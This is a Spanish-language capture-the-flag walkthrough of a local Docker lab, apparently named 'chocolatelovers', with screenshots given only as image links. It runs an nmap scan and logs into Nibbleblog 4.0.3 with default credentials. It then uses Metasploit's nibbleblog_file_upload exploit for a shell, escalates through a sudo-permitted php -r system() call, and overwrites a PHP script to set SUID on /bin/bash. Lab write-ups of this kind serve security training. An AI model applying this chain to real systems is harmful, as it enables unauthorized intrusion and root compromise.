
Desplegamos el contenedor:

```Bash
bash auto_deploy.sh chocolatelovers.tar
```

![[Pasted image 20250206171518.png]]

Escaneamos la IP:

```Bash
nmap -sV -sC -sS -T 5 -n -Pn -p- 172.17.0.2
```

![[Pasted image 20250206171636.png]]

Nos metemos en la web:

![[Pasted image 20250206172221.png]]

![[Pasted image 20250206172242.png]]

![[Pasted image 20250206172317.png]]

Probamos admin: admin:

![[Pasted image 20250206172346.png]]

![[Pasted image 20250206173029.png]]

Versi√≥n nibblelog 4.0.3.

Buscamos si existe exploit:

```Bash
searchsploit nibbleblog
```

![[Pasted image 20250206173405.png]]

Utilizamos **Metasploit** para explotar la vulnerabilidad:

```
search nibblelog
```

![[Pasted image 20250206173800.png]]

```
use exploit/multi/http/nibbleblog_file_upload
```

![[Pasted image 20250206173811.png]]

```
show options
```

![[Pasted image 20250207085944.png]]

```
set RHOSTS 172.17.0.2
```

![[Pasted image 20250206173926.png]]

```
set USERNAME admin
```

![[Pasted image 20250206173942.png]]

```
set PASSWORD admin
```

![[Pasted image 20250206173954.png]]

```
set TARGETURI /nibbleblog/
```

![[Pasted image 20250206174002.png]]

```
show options
```

![[Pasted image 20250206173733.png]]

```
exploit
```

![[Pasted image 20250206174049.png]]

```
getuid
```

![[Pasted image 20250206174103.png]]

```
shell
```

![[Pasted image 20250206174136.png]]

```Bash
/bin/bash -i
```

![[Pasted image 20250206174205.png]]

Elevamos privilegios:

```Bash
sudo -l
```

![[Pasted image 20250206174226.png]]

```Bash
CMD="/bin/bash"
```

![[Pasted image 20250206174420.png]]

```Bash
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```

![[Pasted image 20250206174434.png]]

```Bash
/bin/bash -i
```

![[Pasted image 20250206174514.png]]

```Bash
whoami
```

![[Pasted image 20250206174536.png]]

Miramos procesos:

```Bash
ps aux
```

![[Pasted image 20250206175224.png]]

Elevamos privilegios de nuevo:

```Bash
cd /opt
```

![[Pasted image 20250206174831.png]]

```Bash
ls
```

![[Pasted image 20250206174850.png]]

```Bash
cat script.php
```

![[Pasted image 20250206174945.png]]

```Bash
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

![[Pasted image 20250206175324.png]]

```Bash
ls -l /bin/bash
```

![[Pasted image 20250206175514.png]]

```Bash
bash -p
```

![[Pasted image 20250206175528.png]]

```Bash
whoami
```

![[Pasted image 20250206175651.png]]

